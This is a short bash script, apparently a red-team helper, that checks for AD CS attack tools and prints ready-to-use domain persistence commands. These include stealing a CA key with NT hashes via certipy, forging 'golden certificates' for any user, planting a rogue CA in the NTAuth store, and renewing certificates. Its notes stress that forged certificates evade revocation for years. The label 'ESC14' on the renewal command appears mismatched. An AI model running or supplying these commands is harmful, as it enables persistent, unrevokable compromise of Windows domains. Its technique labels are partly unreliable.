#!/bin/bash
# AD CS Persistence Capability Checker
# Checks for required tools and environment for AD CS persistence operations

set -e

echo "=== AD CS Persistence Environment Check ==="
echo ""

# Check for required tools
echo "Checking for required tools..."

TOOLS=("certipy" "certutil" "certmgr")
for tool in "${TOOLS[@]}"; do
    if command -v $tool &> /dev/null; then
        echo "✓ $tool found"
    else
        echo "✗ $tool not found"
    fi
done

echo ""
echo "=== Environment Variables ==="

# Check for common AD environment variables
if [ -n "$DOMAIN" ]; then
    echo "DOMAIN: $DOMAIN"
else
    echo "DOMAIN: not set"
fi

if [ -n "$USERDOMAIN" ]; then
    echo "USERDOMAIN: $USERDOMAIN"
else
    echo "USERDOMAIN: not set"
fi

echo ""
echo "=== Quick Reference ==="
echo ""
echo "Golden Certificate (DPERSIST1):"
echo "  certipy ca 'domain/user@ca.domain' -hashes :LM:NT -backup"
echo "  certipy forge -ca-pfx ca.pfx -upn target@domain -out forged.pfx"
echo ""
echo "Rogue CA Trust (DPERSIST2):"
echo "  certutil -enterprise -f -AddStore NTAuth C:\\Temp\\CERT.crt"
echo "  certutil -enterprise -viewstore NTAuth"
echo ""
echo "Certificate Renewal (ESC14):"
echo "  certipy req -ca CA_NAME -template User -pfx cert.pfx -renew -out renewed.pfx"
echo ""
echo "=== Notes ==="
echo "- Post-2025 (KB5014754): Use SID embedding for Full Enforcement compatibility"
echo "- Forged certificates cannot be revoked (CA unaware of them)"
echo "- Valid for 5-10+ years if root CA remains valid"
echo ""
